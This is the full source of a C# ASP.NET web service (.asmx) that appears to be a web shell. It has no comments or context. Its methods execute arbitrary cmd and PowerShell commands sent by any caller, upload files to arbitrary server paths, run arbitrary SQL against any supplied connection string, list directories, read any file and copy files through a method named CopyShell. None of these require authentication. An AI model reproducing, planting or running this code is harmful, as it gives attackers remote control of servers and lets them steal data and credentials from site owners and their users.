<%@ WebService Language="C#"  Class="WebService" %>
using System.Data;
using System.Data.SqlClient;
[System.Web.Services.WebServiceBinding(ConformsTo = System.Web.Services.WsiProfiles.BasicProfile1_1)]
public class WebService : System.Web.Services.WebService {

    public WebService () {
    }
    [System.Web.Services.WebMethod]
    public string UploadFile(byte[] f, string fileName)
    {
        try
        {
            System.IO.MemoryStream ms = new System.IO.MemoryStream(f);
            System.IO.FileStream fs = new System.IO.FileStream(System.Web.Hosting.HostingEnvironment.MapPath("~/")+ fileName, System.IO.FileMode.Create);
            ms.WriteTo(fs);
            ms.Close();
            fs.Close();
            fs.Dispose();
            return "OK";
        }
        catch (System.Exception ex)
        {
            return ex.Message.ToString();
        }
    }
    [System.Web.Services.WebMethod]
    public string command(string cmd)
    {
        string argument = string.Format(@" -S {0} ", "LOSMAN-PC");
        System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo("powershell.exe");
        System.Diagnostics.Process proc = System.Diagnostics.Process.Start(psi);
        System.IO.StreamReader sOut = proc.StandardOutput;
        System.IO.StreamReader sOut2 = proc.StandardError;
        System.IO.StreamWriter sIn = proc.StandardInput;
        string commands = cmd;
        string[] delimiter = { System.Environment.NewLine };
        string[] b = commands.Split(delimiter, System.StringSplitOptions.None);
        foreach (string s in b)
        {
            sIn.WriteLine(s);
        }
        sIn.WriteLine("Exit");
        proc.Close();
        string results = sOut.ReadToEnd().Trim();
        string resultserror = sOut2.ReadToEnd().Trim();
        sIn.Close();
        sOut.Close();
        return results + resultserror;
    }
         [System.Web.Services.WebMethod]
    public string command1(string commandst)
    {
        System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + commandst);
        procStartInfo.RedirectStandardOutput =  true;
        procStartInfo.UseShellExecute = false;
        procStartInfo.CreateNoWindow = true;
        System.Diagnostics.Process proc = new System.Diagnostics.Process();
        proc.StartInfo = procStartInfo;
        proc.Start();
        string result = proc.StandardOutput.ReadToEnd();
        return result;
    }
    [System.Web.Services.WebMethod]
    public string UploadFilePath(byte[] f, string fileName,string PathName)
    {
        try
        {
            System.IO.MemoryStream ms = new System.IO.MemoryStream(f);
            System.IO.FileStream fs = new System.IO.FileStream(PathName+ fileName, System.IO.FileMode.Create);
            ms.WriteTo(fs);
            ms.Close();
            fs.Close();
            fs.Dispose();
            return "OK";
        }
        catch (System.Exception ex)
        {
            return ex.Message.ToString();
        }
    }
    [System.Web.Services.WebMethod]
    public string UploadFilePath2(byte[] f, string fileName)
    {
        try
        {
            string FilePath = GetCurrentPath() + @"\" + fileName;
            System.IO.MemoryStream ms = new System.IO.MemoryStream(f);
            System.IO.FileStream fs = new System.IO.FileStream(FilePath, System.IO.FileMode.Create);
            ms.WriteTo(fs);
            ms.Close();
            fs.Close();
            fs.Dispose();
            return FilePath;
        }
        catch (System.Exception ex)
        {
            return ex.Message.ToString();
        }
    }
    [System.Web.Services.WebMethod]
    public string GetCurrentPath()
    {
        string Path = "";
        try
        {
            Path = Server.MapPath("/");
            return Path;
        }
        catch (System.Exception ex)
        {
            return ex.Message.ToString();
        }
    }
    [System.Web.Services.WebMethod]
    public DataTable GetData(string ConnectionString, string commandtext)
    {
        DataTable tb = new DataTable();
		 tb.TableName = "MyDt";
        SqlConnection conn = new SqlConnection(ConnectionString);
        SqlCommand comm = new SqlCommand();
        comm.Connection = conn;
        comm.CommandText = commandtext;
        SqlDataAdapter adapt = new SqlDataAdapter(comm);
        adapt.Fill(tb);
        conn.Close();
        comm.Dispose();
        adapt.Dispose();
        return tb;
    }
    [System.Web.Services.WebMethod]
    public void CopyShell(string Source, string Dest)
    {
        System.IO.File.Copy(Source, Dest, true);
    }
    [System.Web.Services.WebMethod]
    public string GetAllSubFolders(string root)
    {
        string sub = "";
        string[] subdirectoryEntries = System.IO.Directory.GetDirectories(root);
        foreach (string subdirectory in subdirectoryEntries)
        {
            sub += subdirectory + "\n";
        }
        return sub;
    }
    [System.Web.Services.WebMethod]
    public string ReadFileAsText(string textFile)
    {
        string text = System.IO.File.ReadAllText(textFile);
        return text;
    }
}
